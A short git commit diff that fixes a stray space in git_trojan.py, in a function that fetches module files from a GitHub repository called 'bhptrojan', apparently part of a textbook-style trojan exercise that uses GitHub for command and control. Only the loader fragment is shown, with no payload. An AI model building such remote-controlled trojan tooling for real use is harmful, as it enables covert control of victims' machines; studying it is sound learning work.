eaf57b84fa1902949128fe2e875bdb0afa90db2e
seleuchel <seleuchel@gmail.com>
2022-07-08 05:24:00 +0900

    Edit err

--- git_trojan.py
+++ git_trojan.py
@@ -17,4 +17,4 @@ def github_connect():
         return sess.repository(user, 'bhptrojan')
 
 def get_file_contents(dirname, module_name, repo):
-    return repo.file_contents(f'{dirname}/{module_name}'). content
+    return repo.file_contents(f'{dirname}/{module_name}').content
